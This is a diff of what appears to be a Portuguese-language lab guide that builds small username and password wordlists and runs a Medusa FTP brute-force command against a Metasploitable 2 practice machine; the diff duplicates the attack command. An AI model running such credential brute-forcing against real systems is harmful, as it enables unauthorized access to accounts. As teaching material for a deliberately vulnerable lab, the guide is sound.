@@ -20,13 +20,12 @@ https://sourceforge.net/projects/metasploitable/files/
 (IP utizado ou que foi descoberto na máquina Metasploitable 2)
 
 echo -e "user\nmsfadmin\nadmin\root" > users.txt
+
 echo -e "123456\nsenha\nqwerty\nmsfadmin" > pass.txt
-medusa -h 192.168.254.3 -U users.txt -P pass.txt -M ftp -t 6
+
 medusa -h 192.168.254.3 -U users.txt -P pass.txt -M ftp -t 6
 
-**Criação de Listas de Palavras**
-
-echo -e "users\nmffadmin\nadimin\nroot" > users.txt
+medusa -h 192.168.254.3 -U users.txt -P pass.txt -M ftp -t 6
 
 **Criação  de Word Lists**
 
